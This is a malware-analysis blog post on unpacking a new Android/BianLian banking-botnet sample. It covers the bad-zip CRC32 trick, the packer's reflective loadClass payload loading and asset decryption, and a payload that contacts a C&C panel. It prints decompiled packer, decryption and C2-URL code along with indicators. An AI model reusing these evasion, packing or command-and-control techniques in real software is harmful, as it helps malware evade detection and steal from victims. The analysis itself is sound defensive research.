@@ -1,0 +1,284 @@
+Bad Zip and new Packer for Android/BianLian
+cryptax.medium.com/bad-zip-and-new-packer-for-android-bianlian-5bdad4b90aeb
+
+@cryptax January 8, 2024
+
+@cryptax
+
+--
+
+I got my hands on a new sample of Android/BianLian (sha256:
+0070bc10699a982a26f6da48452b8f5e648e1e356a7c1667f393c5c3a1150865), a banking
+botnet I have been tracking for months (no, years).
+
+Update Jan 8, 2024: Kavanoz now unpacks the sample successfully. We no longer have to
+patch the APK and unpack it manually.
+
+1/7
+
+
+
+On December 14, 2023, there are 6 active C&C for Android/BianLian botnet. This is a partial
+list which shows (1) a known active C&C (“UP”), (2) a new active C&C (“NEW”) and (3) an
+old C&C which is no longer active.
+
+Attempt to unpack #1
+As most samples are packed nowadays, I directly throw it into Kavanoz to unpack it.
+Kavanoz complains the CRC32 of the AndroidManifest.xml is wrong.
+
+Errors reported by version of Kavanoz mid December 2023. In January 2024, this is fixed.
+
+Update: since version 0.0.3, Kavanoz successfully unpacks the sample. There are no
+longer any Bad CRC32 warnings (Kavanoz handles them) and the payload is
+unpacked without effort :)
+
+# kavanoz 0070bc10699a982a26f6da48452b8f5e648e1e356a7c1667f393c5c3a1150865.apk ✨ 
+Unpacked succesfully!Plugin tag : loader.multidex Plugin description : Unpacker for 
+multidex variants Output file : ./external-44d56932.dex
+
+I open ImHex editor, load the zip pattern and check the CRC32 the file claims.
+
+The APK says the CRC32 of AndroidManifest.xml is 221989D1.
+I unzip the APK manually, and compute the CRC32 of AndroidManifest: 4ec30695. So,
+indeed, the CRC32 is wrong. This is likely to be yet another bad zip technique to evade
+detection.
+
+Attempt to unpack #2
+I fix the zip (ImHex also allows editing of fields) with the expected CRC32 and attempt to run
+Kavanoz again.
+
+Kavanoz of mid December 2023 reports the sample is not packed, and therefore it cannot
+unpack.
+Kavanoz no longer complains about the ZIP, but is unable to unpack, saying the sample is
+not packed. Oh? Isn’t it?
+
+Analysis of the sample
+I load the sample in JEB. The main activity is com.hzmqumevj.qnupqbcrg.MainActivity,
+and clearly we don’t have that code in the bytecode hierarchy. This means the namespace is
+loaded dynamically at runtime somehow. So, it’s packed (or at least, that’s what I call
+packing).
+
+com.hzmqumevj.qnupqbcrg.MainActivity is not present in the DEX
+
+2/7
+
+
+
+The Android Manifest reports the Application class klk.nwvnxcw.gesxyrgih.pgsbauk. I
+decompile the class: there is an interesting method, pxel, which takes as parameter
+com.hzmqumevj.qnupqbcrg.App and klk.nwvnxcw.gesxyrgih.pgsbauk. Notice the first
+argument is within the namespace of our expected main activity, and the second argument is
+in the Application class.
+
+public class pgsbauk extends Application {    @Override  // 
+android.content.ContextWrapper    protected void attachBaseContext(Context base) {    
+super.attachBaseContext(base);        new cgbqqwhkhqtc(base).lxdjreiqgeplv();        
+new qpvubbhox(base).ldvlxapytm();        mfnlxqkiqtucgyv.pxel(this, 
+"com.hzmqumevj.qnupqbcrg.App", "klk.nwvnxcw.gesxyrgih.pgsbauk");    }
+
+The decompilation of pxel shows the first namespace is that of a “delegate application” and
+the other one is the “stub application” (packer). The classes of the delegate applications are
+loaded using loadClass(delegateApplicationName).newInstance, and finally the code
+uses reflection to call application.attach(context0).
+
+public static void pxel(Application application, String delegateApplicationName, 
+String stubApplicationName) {        if(!TextUtils.isEmpty(delegateApplicationName) 
+&& !stubApplicationName.equals(delegateApplicationName)) {            try {           
+Context context0 = application.getBaseContext();                Application 
+application1 = 
+(Application)application.getClassLoader().loadClass(delegateApplicationName).newInstan
+               mfnlxqkiqtucgyv.kkprarriteomawqqubdh = application1;                
+afuwsub.dqosdunynxis_invoke(Application.class, application1, new Object[]{context0}, 
+"attach", new Class[]{Context.class});  // application1.attach(context0);            
+}
+
+So, this is how the com.hzmqumevj.qnupqbcrg namespace is loaded, but where is the code?
+We go back to previous method (attachBaseContext) and inspect the code of
+cgbqqwhkhqtc(base).lxdjreiqgeplv() . We immediately see it is fetching a DEX from the
+assets/moqls directory. The DEX probably contains the payload.
+
+public void ldvlxapytm() {        try {            Context context = 
+qpvubbhox.lpqswjix;            String[] arr_s = 
+qpvubbhox.lpqswjix.getAssets().list("moqls");            File file0 = 
+jqlkjyurilcnb.tkqesiyuf(context);            for(int v = 0; v < arr_s.length; ++v) {  
+String dexName = arr_s[v];                if(dexName.endsWith(".joi")) {              
+File file = new File(file0, dexName);                    try {                        
+ecywjikvj.lgqqacadyiwet(context.getAssets().open("moqls/" + dexName), new 
+FileOutputStream(file));                    } ...
+
+The method which processes the asset file is ecywjikvj.lgqqacadyiwet(). It does some
+ugly decryption on the file:
+
+3/7
+
+
+
+public static void lgqqacadyiwet(InputStream input, OutputStream output) throws 
+Exception {
+       Inf laterInputStream is = new InflaterInputStream(input);
+       InflaterOutputStream os = new InflaterOutputStream(outpu t);
+       ecywjikvj.nbfp(is, os);  
+
+       os.close();  
+
+       is.close(); 
+
+   }  
+
+   private static void nbfp(InputStream inputStream, OutputStream outputStream) 
+throws Exception {
+       char[] arr _c = 
+"\u6368\uBE91\u621A\uE684\u8073\u8E16\u66E1\u3495\u8E9A\uDAFD\uFD83\uD08E".toCharArray
+       int[] iArr = {arr_c[0] | arr_c[1] << 16, arr_c[3] << 16 | arr_c[2], arr_c[5] 
+<< 16 | arr_c[4], arr_c[7] << 16 | arr_c[6]};
+       int[] iArr2 = {arr_c[9] << 16 | arr_c [8], arr_c[10] | arr_c[11] << 16};
+       int[] iArr = ecywjikvj.ghbbwx(iArr);  
+
+       byte[] bArr = new byte[0x2000];  
+
+       int i3 = 0;  
+
+       while(true)  {
+           int v1 =  inputStream.read(bArr);
+           if(v1 < 0) {  
+
+               return;  
+
+           }  
+
+           for(int i5 = 0; i3 < i3 + v1; ++i5) {
+               if(i3 % 8 == 0) {  
+
+                   ecywjikvj.bcv y(iArr, iArr2);
+               }  
+
+               bArr[i5] = (byte)(((byte)(iArr2[i3 % 8 / 4] >> i3 % 4 * 8)) ^ 
+bArr[i5]);
+                ++i3;
+           }  
+
+           outputStream.write(bArr, 0, v1);        }    }
+
+Unpacking with the help of Medusa
+We know that an asset file inside the directory moqls is decrypted and dumped in a file with
+.joi extension. If you attempt to install the malware on an emulator, run it and hope to get
+the payload .joi file, you’ll be disappointed because the file is not there: it’s common that
+packers delete such files so as not to help the malware analyst too much 😁
+
+4/7
+
+
+
+So, we have two solutions: (a) implement a static unpacker from the code
+ecywjikvj.lgqqacadyiwet(), (b) use Medusa to prevent deletion of the file. Both solutions
+are valid: the first one is the best (from a malware analyst’s perspective), the second one is
+the quickest. Today, I’m a hurry and use option b (usually though, I always prefer static
+approaches!).
+
+In Medusa, I select module file_system/prevent_delete (use
+file_system/prevent_delete and then compile), and run the malware in an Android
+emulator with Frida.
+
+Medusa’s module prevented deletion of oxcsbcc.joi
+Then, I retrieve the file from the emulator. Hurray, it’s a DEX!
+
+We have successfully unpacked the malware!
+
+Quick analysis of the payload
+In the Android emulator, notice the malware is asking the victim to enable accessibility. It also
+shows a notification, claiming to be from the Play Store app and saying you absolutely need
+to enable accessibility.
+
+Malware tries to trick the victim to enable accessibility. Do not do this!
+I decompile the DEX in JEB and now happily find com.hzmqumevj.qnupqbcrg.MainActivity.
+
+package com.hzmqumevj.qnupqbcrg;
+
+import android.content.Intent;
+import android.os.Bundle;  
+
+import com.hzmqumevj.qnup qbcrg.bot.SdkManagerImpl;
+import com.hzmqumevj.qnupqbcrg.bot.utils.SharedPre fHelper;
+
+public class MainActivity extends RootMainActivity {
+
+The class inherits from RootMainActivity that I inspect and see there is some geographic
+test: the malware will crash if run on a phone with Russian or Ukrainian language.
+
+5/7
+
+
+
+protected void onCreate(Bundle bundle0) {
+       super.onCreate(bundle0);
+       Locale locale0 = this.ge tResources().getConfiguration().locale;
+       if(!locale0.getLanguage().equals("ru") &&  
+
+!locale0.getLanguage().equals("ua")) {
+           try {  
+
+               i f(!SdkManagerImpl.isAllPermissionsGranted(this)) {
+                   goto label_10;  
+
+               }  
+
+            ...  
+
+       label_10:
+           if(Sh aredPrefHelper.getFirstRunTime(this) <= 0L) {
+               SharedPrefHelper.setFirstRunTime(this, System. currentTimeMillis());
+           }  
+
+           SDKInitializer.setContext(this.getApplicationContext());
+           SDKInitializer.init(this.getApplicationContext());  
+
+           this.finish();
+           PermissionsAct ivity.start(this);
+           return;  
+
+       }  
+
+       this.callCrash();    }
+
+I recognize the typical classes of BianLian: SDKInitializer. If we decompile
+SDKInitializer, we see this particular sample implements several malicious modules:
+SMS, USSD, screen locker, injections, socks5, screen cast, soundSwitcher. Please refer to
+my presentation at Virus Bulletin for more information on BianLian.
+
+The C&C for this sample was hxxp://canbozengelemezdoms.net (no longer responding).
+
+private void loadAdminInfoByGist() {
+       if(SharedPrefHelper.getAdminP anelUrl(SDKInitializer.getContext()).isEmpty()) 
+{
+            SharedPrefHelper.setAdminPanelUrl(SDKInitializer.getContext(), 
+"http://canbozengelemezdoms.net");
+       }  
+
+       String s = SharedPrefHelper.getAdminPanelUrl(SDKInitializer.getContext()) + 
+"/api/mirrors";
+
+This domain was last seen in September 2023, and VirusTotal tells us its last seen IP
+address 83.97.73.197.
+
+Wrapping up
+
+6/7
+
+
+
+This is a sample of Android/BianLian botnet. The C2 it used to report to is no longer active
+(but others are).
+
+The sample uses two advanced anti-reversing techniques:
+
+1. An intentionally , with wrong CRC32 for the Android Manifest.
+2. A which loads dynamically the payload via loadClass() which is far less visible than
+
+DexClassLoader.
+
+Kavanoz (version of mid December 2023) is usually excellent at unpacking samples, but it
+was unable to process this one. After patching the ZIP issue, it wrongly assumed the sample
+was not packed although it was. This is now fixed, and Kavanoz does the work automatically
+for us :) Medusa helped dynamically recover the payload.
+
+— Cryptax
